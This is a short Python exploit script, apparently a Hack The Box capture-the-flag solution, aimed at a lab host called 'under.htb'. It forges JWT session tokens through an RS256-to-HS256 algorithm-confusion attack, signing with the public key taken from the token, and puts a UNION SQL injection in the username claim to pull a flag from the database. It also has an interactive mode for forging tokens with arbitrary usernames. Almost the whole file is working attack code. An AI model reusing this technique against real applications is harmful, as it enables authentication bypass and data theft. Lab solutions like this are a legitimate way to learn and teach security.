#!/bin/bash
import requests
import jwt
import hmac, hashlib, base64
import json
from bs4 import BeautifulSoup
import re


if __name__ == '__main__':
    try:
        ENDPOINT = 'http://under.htb:59080' # change it

        # register request
        data = {'username': 'p', 'password': 'p', 'register': 'Register'}
        response = requests.post(f'{ENDPOINT}/auth', data=data)
        
        if response.status_code == 200:
            print('[+] Registered new user')
            # login request
            data = {'username': 'p', 'password': 'p', 'login': 'Login'}
            response = requests.post(f'{ENDPOINT}/auth', data=data)
            
            if response.status_code == 200:
                session_jwt = response.request._cookies['session']
                print(f'[+] Got JWT token: {session_jwt}')
                
                payload = jwt.decode(session_jwt, options={"verify_signature": False})
                print('[+] Decoded JWT token')
                
                header = json.loads(base64.b64decode(session_jwt.split('.')[0]))
                header['alg'] = 'HS256'
                
                #Encodando header
                encodedHeader = base64.urlsafe_b64encode(json.dumps(header,separators=(",",":")).encode()).decode('UTF-8').strip("=")
                print('[+] Encoded Header')

                # you can manually exploit the target or get the flag entering 'y'
                cmd = input('[?] Get the flag? (y/n) ').lower()
                
                if cmd == 'y':
                    payload['username'] = "' OR 1 = 1 UNION SELECT 1, (SELECT top_secret_flaag FROM flag_storage), 3 --"
                else:
                    payload['username'] = input('[?] Enter the username: ')
                    
                print(f"[+] Changed username to: {payload['username']}")
                
                encodedPayload = base64.urlsafe_b64encode(json.dumps(payload,separators=(",",":")).encode()).decode('UTF-8').strip("=")
                print('[+] Encoded Payload')
                
                token = (encodedHeader + "." + encodedPayload)
                sig = base64.urlsafe_b64encode(hmac.new(bytes(payload['pk'], "UTF-8"), token.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
                
                new_jwt = f'{token}.{sig}'
                cookies = {'session': new_jwt}
                response = requests.get(ENDPOINT, cookies=cookies)
                print('[+] Made a new request with the new JWT')
                
                if response.status_code == 200:
                    if cmd == 'y':
                        soup = BeautifulSoup(response.text, 'html.parser')
                        divs = soup.find_all("div", {"class": "card-body"})
                        match = re.search(r"HTB\{[^}]+\}", divs[0].text)
                        if match:
                            print(f'[+] The flag: {match.group()}')
                    else:
                        print(f'[+] Valid JWT: {new_jwt}')
                else:
                    print(f'[-] HTTP status: {response.status_code}')
            else:
                response.raise_for_status()
        else:
            print('[-] Error during using registration')
    except Exception as ex:
        print(f'[-] Exception: {ex}')
